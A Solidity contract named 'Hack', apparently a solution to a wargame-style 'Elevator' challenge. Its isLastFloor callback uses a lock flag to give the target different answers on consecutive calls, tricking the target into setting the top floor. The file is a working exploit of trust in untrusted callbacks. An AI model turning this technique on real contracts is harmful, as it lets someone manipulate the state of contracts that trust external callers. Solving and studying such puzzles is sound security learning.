// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IElevator {
    function goTo(uint) external;

    function floor() external view returns (uint256);
}

contract Hack {
    IElevator private elevator;
    bool lock;

    constructor(address contractAddress) {
        elevator = IElevator(contractAddress);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (!lock) {
            lock = true;
            return elevator.floor() == _floor ? true : false;
        } else {
            return true;
        }
    }

    function attack(uint _floor) public {
        elevator.goTo(_floor);
    }
}